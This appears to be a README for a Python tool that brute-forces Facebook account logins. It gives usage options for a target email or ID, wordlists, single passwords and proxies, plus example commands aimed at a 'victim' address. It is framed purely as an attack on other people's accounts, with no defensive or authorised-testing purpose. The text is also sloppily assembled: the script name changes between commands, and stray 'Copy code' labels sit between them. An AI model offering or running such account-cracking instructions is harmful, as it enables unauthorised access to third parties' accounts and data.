# Facebook Hack Tool

This tool is designed to perform brute-force attacks on Facebook accounts. It allows you to specify a target email or Facebook ID, along with a wordlist or a single password, to attempt to log in to the target account.

## Prerequisites

Before using this tool, ensure you have the following installed:

- Python (2.7 or later)
- Requests module (`pip install requests`)
- Mechanize module (`pip install mechanize`)

## Usage

To use the tool, follow these steps:

1. Clone the repository:

git clone https://github.com/your_username/facebook-hack-tool.git
cd facebook-hack-tool


2. Run the script:

python facebook_hack.py [OPTIONS...]


3. Options:

   - `-t <target email>` or `<FACEBOOK ID>`: Specify the target email or Facebook ID.
   - `-w <wordlist Path>`: Specify the path to the wordlist file.
   - `-s <single password>`: Specify a single password to check.
   - `-p <Proxy IP:PORT>`: Specify an HTTP/S proxy (optional).
   - `-g <TARGET Facebook Profile URL>`: Specify the target Facebook profile URL to get their ID.
   - `-u/--update`: Update the Facebook Hack tool.

## Examples

Here are some examples of how to use the tool:

- Brute-force attack using a wordlist:

python facebook_hack.py -t victim@gmail.com -w /path/to/wordlist.txt


- Brute-force attack using a single password:

python facebook_brute.py -t victim@gmail.com -s 1234567

arduino
Copy code

- Brute-force attack using a proxy:

python facebook_hack.py -t victim@gmail.com -w /path/to/wordlist.txt -p 144.217.101.245:3129

bash
Copy code

## Update

To update the Facebook Hack tool, run the following command:

python facebook_brute.py -u

csharp
Copy code

## Credits

This tool was created by [Likhon Scripts](https://t.me/ScriptsChats).

## License

This project is licensed under the [MIT License](LICENSE).
